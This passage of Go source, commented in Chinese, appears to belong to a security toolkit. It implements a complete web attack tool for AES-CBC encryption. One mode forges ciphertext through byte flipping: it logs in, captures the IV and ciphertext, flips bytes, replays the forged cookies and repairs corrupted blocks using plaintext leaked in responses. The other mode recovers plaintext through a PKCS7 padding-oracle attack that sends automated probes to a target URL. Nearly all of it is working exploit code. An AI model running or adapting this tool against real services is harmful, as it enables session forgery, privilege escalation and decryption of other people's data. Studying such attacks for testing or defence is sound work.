	// 有序 Cookie 列表（后写覆盖前写，等价 Python dict）
	cookies := [][2]string{}
	setCk := func(k, v string) {
		for i := range cookies {
			if cookies[i][0] == k {
				cookies[i][1] = v
				return
			}
		}
		cookies = append(cookies, [2]string{k, v})
	}
	getCk := func(k string) (string, bool) {
		for i := len(cookies) - 1; i >= 0; i-- {
			if cookies[i][0] == k {
				return cookies[i][1], true
			}
		}
		return "", false
	}

	// 1) 登录/获取请求
	body := ""
	var setckPairs [][2]string
	if urlRaw != "" {
		st, b, setck, err := reqRetry("登录", urlRaw, paramStr(params, "login_method"), paramStr(params, "login_params"), nil)
		if err != nil {
			return err
		}
		body = b
		setckPairs = setck
		paramsDesc := paramStr(params, "login_params")
		if paramsDesc == "" {
			paramsDesc = "无参数"
		}
		*report = append(*report, fmt.Sprintf("[登录] %s %s（%s）→ HTTP %d", paramStr(params, "login_method"), urlRaw, paramsDesc, st))
		setckDesc := strings.Join(cookieKeys(setckPairs), ", ")
		if setckDesc == "" {
			setckDesc = "无"
		}
		*report = append(*report, fmt.Sprintf("[登录] Set-Cookie: %s", setckDesc))
		if paramStr(params, "session_cookie") != "" {
			if v, ok := lastCookie(setckPairs, paramStr(params, "session_cookie")); ok {
				setCk(paramStr(params, "session_cookie"), v)
			} else {
				*report = append(*report, fmt.Sprintf("[提示] 登录响应未发现会话 Cookie %s，继续重放", paramStr(params, "session_cookie")))
			}
		}
	} else {
		*report = append(*report, "[材料] 手动来源：跳过登录，直接使用 manual_iv / manual_cipher")
	}

	// 2) 获取 iv / cipher
	var ivVal, ctVal string
	switch paramStr(params, "source_type") {
	case "manual":
		if !inCipher {
			ivVal = paramStr(params, "manual_iv")
		}
		ctVal = paramStr(params, "manual_cipher")
	case "cookie":
		var names []string
		if inCipher {
			names = []string{paramStr(params, "cipher_cookie")}
		} else {
			names = []string{paramStr(params, "iv_cookie"), paramStr(params, "cipher_cookie")}
		}
		for _, k := range names {
			if v, ok := lastCookie(setckPairs, k); ok {
				setCk(k, v)
			}
		}
		var missing []string
		for _, k := range names {
			if _, ok := getCk(k); !ok {
				missing = append(missing, k)
			}
		}
		if len(missing) > 0 {
			return verrf("登录响应缺少 Cookie: %s；收到的: %s", pyStrListRepr(missing), pyStrListRepr(cookieKeys(setckPairs)))
		}
		if !inCipher {
			ivVal, _ = getCk(paramStr(params, "iv_cookie"))
		}
		ctVal, _ = getCk(paramStr(params, "cipher_cookie"))
	default: // body
		mctRe, err := regexp.Compile(paramStr(params, "cipher_body_regex"))
		if err != nil {
			return err
		}
		mct := mctRe.FindStringSubmatch(body)
		var miv []string
		if !inCipher {
			mivRe, err := regexp.Compile(paramStr(params, "iv_body_regex"))
			if err != nil {
				return err
			}
			miv = mivRe.FindStringSubmatch(body)
		}
		if mct == nil || (!inCipher && miv == nil) {
			return verrf("未能用 iv_body_regex/cipher_body_regex 从登录响应捕获值；响应片段: %s", excerpt(body, 200))
		}
		if !inCipher {
			ivVal = miv[1]
		}
		ctVal = mct[1]
	}

	rawCt, err := decodeMaterial(ctVal, ve)
	if err != nil {
		return err
	}
	var ivb, cb []byte
	if inCipher {
		ivb = rawCt[:cbcBlock]
		cb = rawCt[cbcBlock:]
	} else {
		ivb, err = decodeMaterial(ivVal, ve)
		if err != nil {
			return err
		}
		cb = rawCt
	}
	if len(ivb) != cbcBlock || len(cb)%cbcBlock != 0 {
		return verrf("捕获值解码异常: iv=%dB cipher=%dB（应为 16 的倍数）", len(ivb), len(cb))
	}
	*report = append(*report, fmt.Sprintf("[材料] iv=%s cipher=%dB（%d 块）", encodeMaterial(ivb, ve), len(cb), len(cb)/cbcBlock))

	// 3) 定位 + 期望明文
	_, dd, segs, _, corrupted, _, err := cbcLocate(params, report)
	if err != nil {
		return err
	}
	cbcDescribeFlip(segs, report)

	// 4) 应用全部翻转
	for _, s := range segs {
		if s.j == 0 {
			ivb[s.o] ^= byte(s.d)
		} else {
			cb[(s.j-1)*cbcBlock+s.o] ^= byte(s.d)
		}
	}

	// 5) 重放
	hasIvPh := strings.Contains(paramStr(params, "replay_params"), "{iv}")
	hasCtPh := strings.Contains(paramStr(params, "replay_params"), "{cipher}")
	extra := parseCBCPairs(paramStr(params, "extra_cookies"))

	currentValues := func() (string, string) {
		ivEnc := encodeMaterial(ivb, ve)
		ctEnc := encodeMaterial(cb, ve)
		if inCipher {
			return ivEnc, ivEnc + ctEnc // {iv}=IV 部分；{cipher}=完整 iv‖ct
		}
		return ivEnc, ctEnc
	}

	sendAndReport := func(label string) (string, error) {
		if interval > 0 {
			time.Sleep(time.Duration(interval * float64(time.Second)))
		}
		ivEnc, ctEnc := currentValues()
		paramsStr := paramStr(params, "replay_params")
		if hasIvPh || hasCtPh {
			paramsStr = strings.ReplaceAll(paramsStr, "{iv}", pyQuote(ivEnc))
			paramsStr = strings.ReplaceAll(paramsStr, "{cipher}", pyQuote(ctEnc))
		}
		sendCookies := [][2]string{}
		sendCookies = append(sendCookies, cookies...)
		if inCipher {
			if !hasCtPh {
				setPair(&sendCookies, paramStr(params, "cipher_cookie"), ctEnc)
			}
		} else {
			if !hasIvPh {
				setPair(&sendCookies, paramStr(params, "iv_cookie"), ivEnc)
			}
			if !hasCtPh {
				setPair(&sendCookies, paramStr(params, "cipher_cookie"), ctEnc)
			}
		}
		// extra 在前、cookies 覆盖同键（等价 {**extra_now, **send_cookies}）
		merged := [][2]string{}
		for _, p := range extra {
			v := strings.ReplaceAll(p[1], "{iv}", ivEnc)
			v = strings.ReplaceAll(v, "{cipher}", ctEnc)
			setPair(&merged, p[0], v)
		}
		for _, p := range sendCookies {
			setPair(&merged, p[0], p[1])
		}
		st, b, _, err := reqRetry(label, replayURL, paramStr(params, "replay_method"), paramsStr, merged)
		if err != nil {
			return "", err
		}
		paramsDesc := paramsStr
		if paramsDesc == "" {
			paramsDesc = "仅 Cookie"
		}
		*report = append(*report, fmt.Sprintf("[%s] %s %s（%s）→ HTTP %d（%s）",
			label, paramStr(params, "replay_method"), replayURL, paramsDesc, st, excerpt(b, 160)))
		ckDesc := cookieHeaderStr(merged)
		if ckDesc == "" {
			ckDesc = "无"
		}
		*report = append(*report, fmt.Sprintf("  └─ Cookie: %s", ckDesc))
		return b, nil
	}

	parseLeak := func(bodyText string) ([]byte, bool) {
		re, err := regexp.Compile(paramStr(params, "leak_regex"))
		if err != nil {
			return nil, false
		}
		m := re.FindStringSubmatch(bodyText)
		if m == nil {
			return nil, false
		}
		b, err := decodeMaterial(m[1], paramStr(params, "leak_encoding"))
		if err != nil {
			return nil, false
		}
		return b, true
	}

	// 6) 首次重放
	body, err = sendAndReport("翻转重放")
	if err != nil {
		return err
	}

	// 7) 级联补偿：从最高被破坏块向下逐级修复，块 0 用 IV
	if len(corrupted) > 0 {
		pending := map[int]bool{}
		for _, c := range corrupted {
			pending[c] = true
		}
		for len(pending) > 0 {
			b := -1
			for k := range pending {
				if k > b {
					b = k
				}
			}
			delete(pending, b)
			leaked, ok := parseLeak(body)
			attempt := 0
			for (!ok || len(leaked) < (b+1)*cbcBlock) && attempt < retries {
				wait := 1 << attempt
				*report = append(*report, fmt.Sprintf("[重试] 响应未解析到泄露明文（需要块 %d），%ds 后重发", b, wait))
				time.Sleep(time.Duration(wait) * time.Second)
				body, err = sendAndReport(fmt.Sprintf("泄露重试 %d", attempt+1))
				if err != nil {
					return err
				}
				leaked, ok = parseLeak(body)
				attempt++
			}
			if !ok || len(leaked) < (b+1)*cbcBlock {
				return verrf("未从响应解析到泄露明文（需要块 %d 的垃圾值）。检查 leak_regex/leak_encoding；响应片段: %s", b, excerpt(body, 200))
			}
			g := leaked[b*cbcBlock : (b+1)*cbcBlock]
			want := dd[b*cbcBlock : (b+1)*cbcBlock]
			delta := make([]byte, len(g))
			for i := range g {
				delta[i] = g[i] ^ want[i]
			}
			if b == 0 {
				for i := range delta {
					ivb[i] ^= delta[i]
				}
				*report = append(*report, fmt.Sprintf("[补偿] 块 0 垃圾 %s → IV ^= Δ（恢复期望前缀）", pyBytesRepr(g)))
				body, err = sendAndReport("IV 补偿重放")
				if err != nil {
					return err
				}
			} else {
				for i := range delta {
					cb[(b-1)*cbcBlock+i] ^= delta[i]
				}
				*report = append(*report, fmt.Sprintf("[补偿] 块 %d 垃圾 → 翻转 C[%d] 修复（连带破坏块 %d）", b, b-1, b-1))
				body, err = sendAndReport(fmt.Sprintf("修复块 %d", b))
				if err != nil {
					return err
				}
				pending[b-1] = true
			}
		}
	}

	// 8) 成功标志
	if re, err := regexp.Compile(paramStr(params, "success_regex")); err == nil {
		if m := re.FindString(body); m != "" {
			*report = append(*report, fmt.Sprintf("[成功] %s", m))
			return nil
		}
	}
	*report = append(*report, "[结果] 未匹配成功标志，响应片段:")
	*report = append(*report, "  └─ "+excerpt(body, 300))
	*report = append(*report, "[提示] 检查 success_regex / 目标判定条件（如 'Hello admin'）")
	return nil
}

// setPair 后写覆盖（等价 Python dict 赋值语义，保持插入序）。
func setPair(pairs *[][2]string, k, v string) {
	for i := range *pairs {
		if (*pairs)[i][0] == k {
			(*pairs)[i][1] = v
			return
		}
	}
	*pairs = append(*pairs, [2]string{k, v})
}

// ---------------------------------------------------------------------------
// oracle 模式：PKCS7 Padding Oracle 全明文恢复
// ---------------------------------------------------------------------------

func cbcRunOracle(ctx context.Context, params map[string]any, report *[]string) error {
	_ = ctx
	interval := paramFloat(params, "interval")
	retries := paramInt(params, "retries")
	if retries < 1 {
		retries = 1
	}
	urlRaw := strings.TrimRight(paramStr(params, "oracle_url"), "/")
	ve := paramStr(params, "value_encoding")
	ie := paramStr(params, "input_encoding")
	inCipher := paramBool(params, "iv_in_cipher")
	client := cbcClient()

	// 连接级错误退避重试；HTTP 错误码经 noraise 作为 oracle 响应返回
	reqRetry := func(label, url, method, pairs string, cookies [][2]string) (int, string, error) {
		var lastErr error
		for attempt := 0; attempt < retries; attempt++ {
			st, b, err := cbcRequestNoraise(client, url, method, pairs, cookies)
			if err == nil {
				return st, b, nil
			}
			lastErr = err
			if attempt+1 < retries {
				wait := 1 << attempt
				*report = append(*report, fmt.Sprintf("[重试] %s %s: %v（第 %d/%d 次失败），%ds 后重试",
					label, pyErrName(err), err, attempt+1, retries, wait))
				time.Sleep(time.Duration(wait) * time.Second)
			}
		}
		return 0, "", lastErr
	}

	// 目标密文与 IV
	tgt := paramStr(params, "target_cipher")
	if tgt == "" {
		tgt = paramStr(params, "cipher_b64")
	}
	raw, err := decodeMaterial(tgt, ie)
	if err != nil {
		return err
	}
	var ivb []byte
	if paramStr(params, "iv_b64") != "" {
		ivb, err = decodeMaterial(paramStr(params, "iv_b64"), ie)
		if err != nil {
			return err
		}
	}
	if inCipher {
		if len(raw) < 2*cbcBlock {
			return verrf("iv_in_cipher 时密文（iv‖ct）至少 32 字节")
		}
		ivb = raw[:cbcBlock]
		raw = raw[cbcBlock:]
	}
	if len(raw)%cbcBlock != 0 {
		return verrf("目标密文长度 %d 不是 16 的倍数", len(raw))
	}
	if ivb != nil && len(ivb) != cbcBlock {
		return verrf("IV 必须 16 字节（现 %d）", len(ivb))
	}
	var blocks [][]byte
	for i := 0; i < len(raw); i += cbcBlock {
		blocks = append(blocks, raw[i:i+cbcBlock])
	}
	ivDesc := "，已提供 IV，可恢复块 0"
	if ivb == nil {
		ivDesc = "，未提供 IV，跳过块 0"
	}
	*report = append(*report, fmt.Sprintf("[目标] 密文 %d 块（%dB）%s", len(blocks), len(raw), ivDesc))

	var okRe *regexp.Regexp
	if paramStr(params, "oracle_ok_regex") != "" {
		okRe, err = regexp.Compile(paramStr(params, "oracle_ok_regex"))
		if err != nil {
			return err
		}
	}
	okStatus := paramInt(params, "oracle_ok_status")
	invert := paramBool(params, "oracle_invert")
	extra := parseCBCPairs(paramStr(params, "extra_cookies"))
	baseParams := paramStr(params, "oracle_params")

	oracle := func(prev, cur []byte) (bool, error) {
		if interval > 0 {
			time.Sleep(time.Duration(interval * float64(time.Second)))
		}
		enc := encodeMaterial(append(append([]byte{}, prev...), cur...), ve)
		ps := strings.ReplaceAll(baseParams, "{payload}", pyQuote(enc))
		ck := [][2]string{}
		for _, p := range extra {
			setPair(&ck, p[0], p[1])
		}
		if paramStr(params, "oracle_cookie") != "" {
			setPair(&ck, paramStr(params, "oracle_cookie"), enc)
		}
		st, b, err := reqRetry("oracle 探测", urlRaw, paramStr(params, "oracle_method"), ps, ck)
		if err != nil {
			return false, err
		}
		ok := (okStatus == 0 || st == okStatus) && (okRe == nil || okRe.MatchString(b))
		if invert {
			return !ok, nil
		}
		return ok, nil
	}

	// Oracle 自检：原密文（填充必然有效）与随机前缀（几乎必然无效）判定应相反
	var refValid *bool
	if ivb != nil && len(blocks) == 1 {
		v, err := oracle(ivb, blocks[0])
		if err != nil {
			return err
		}
		refValid = &v
	} else if len(blocks) >= 2 {
		v, err := oracle(blocks[len(blocks)-2], blocks[len(blocks)-1])
		if err != nil {
			return err
		}
		refValid = &v
	}
	if refValid != nil {
		refRandom, err := oracle(make([]byte, cbcBlock), blocks[len(blocks)-1])
		if err != nil {
			return err
		}
		if !*refValid {
			*report = append(*report, "[警告] Oracle 自检：原始密文被判为「填充无效」——目标密文、iv_b64 或判定配置可能有问题")
		}
		if *refValid == refRandom {
			*report = append(*report, fmt.Sprintf("[警告] Oracle 自检：原密文与随机前缀判定相同（均为 %t），判定配置可能无法区分有效/无效填充；注意正则别匹配到失败响应（如 VALID 会匹配 INVALID），或检查 oracle_invert", *refValid))
		} else {
			*report = append(*report, fmt.Sprintf("[自检] Oracle 判定可区分（原密文=%t，随机前缀=%t）", *refValid, refRandom))
		}
	}

	// 逐块恢复（从最后一块向前）
	plaintextBlocks := make([][]byte, len(blocks))
	for bi := len(blocks) - 1; bi >= 0; bi-- {
		if bi == 0 && ivb == nil {
			*report = append(*report, "[提示] 未提供 IV，跳过块 0（提供 iv_b64 或勾选 iv_in_cipher 可恢复首块）")
			continue
		}
		var prev []byte
		if bi == 0 {
			prev = ivb
		} else {
			prev = blocks[bi-1]
		}
		cur := blocks[bi]
		*report = append(*report, fmt.Sprintf("[进度] 恢复块 %d/%d（最多 %d 次探测）", bi, len(blocks)-1, cbcBlock*256))
		rec := make([]byte, cbcBlock)
		probe := bytes.Clone(prev)
		for pad := 1; pad <= cbcBlock; pad++ {
			for k := 1; k < pad; k++ {
				probe[cbcBlock-k] = prev[cbcBlock-k] ^ rec[cbcBlock-k] ^ byte(pad)
			}
			found := -1
			for g := 0; g < 256; g++ {
				probe[cbcBlock-pad] = prev[cbcBlock-pad] ^ byte(g) ^ byte(pad)
				valid, err := oracle(probe, cur)
				if err != nil {
					return err
				}
				if valid {
					if pad == 1 {
						// 排除误报：翻转倒数第二字节后必须仍判有效，才认为 pad=1 成立
						probe[cbcBlock-2] ^= 1
						still, err := oracle(probe, cur)
						if err != nil {
							return err
						}
						probe[cbcBlock-2] ^= 1
						if still {
							found = g
							break
						}
					} else {
						found = g
						break
					}
				}
			}
			if found < 0 {
				return verrf("块 %d 的 padding=%d 字节未找到（256 个候选全无效），检查 oracle 判定配置（oracle_ok_regex / oracle_ok_status / oracle_invert）", bi, pad)
			}
			rec[cbcBlock-pad] = byte(found)
		}
		plaintextBlocks[bi] = rec
		*report = append(*report, fmt.Sprintf("[恢复] 块 %d: %s", bi, pyBytesRepr(rec)))
	}

	full := bytes.Join(plaintextBlocks, nil)
	if ivb == nil {
		*report = append(*report, "[结果] 注：块 0 未恢复（缺 IV），以下明文从块 1 开始")
	}
	*report = append(*report, fmt.Sprintf("[结果] 恢复明文（%dB，hex）: %s", len(full), hex.EncodeToString(full)))
	*report = append(*report, fmt.Sprintf("[结果] 恢复明文（raw）: %s", pyBytesRepr(full)))
	if len(full) > 0 {
		last := int(full[len(full)-1])
		if last >= 1 && last <= cbcBlock && bytes.Equal(full[len(full)-last:], bytes.Repeat([]byte{byte(last)}, last)) {
			stripped := full[:len(full)-last]
			*report = append(*report, fmt.Sprintf("[结果] 去除 PKCS7 填充（%dB）: %s", last, pyBytesRepr(stripped)))
			if utf8Valid(stripped) {
				*report = append(*report, fmt.Sprintf("[结果] 明文文本（utf-8）: %s", string(stripped)))
			}
		}
	}
	*report = append(*report, "[提示] 把恢复出的明文填入 plaintext 模板，即可用 flip/attack 模式做字节翻转")
	return nil
}

// ---------------------------------------------------------------------------

func aesCbcRun(ctx context.Context, params map[string]any, tc *core.ToolContext) (*core.ToolResult, error) {
	mode := paramStr(params, "mode")
	report := []string{fmt.Sprintf("[模式] %s（AES-CBC 字节翻转，块长 %d）", mode, cbcBlock)}
	var err error
	switch mode {
	case "flip":
		err = cbcRunFlip(params, &report)
	case "attack":
		err = cbcRunAttack(ctx, params, &report)
	case "oracle":
		err = cbcRunOracle(ctx, params, &report)
	default:
		err = verrf("未知模式: %s（flip / attack / oracle）", mode)
	}
	if err != nil {
		var ve *valueError
		if errors.As(err, &ve) {
			report = append(report, fmt.Sprintf("[错误] %v", err))
		} else {
			report = append(report, fmt.Sprintf("[中止] %s: %v", pyErrName(err), err))
		}
		return &core.ToolResult{Status: core.StatusError, Stdout: strings.Join(report, "\n"), Stderr: err.Error()}, nil
	}
	return &core.ToolResult{Status: core.StatusSuccess, Stdout: strings.Join(report, "\n"), Data: map[string]any{"mode": mode}}, nil
}
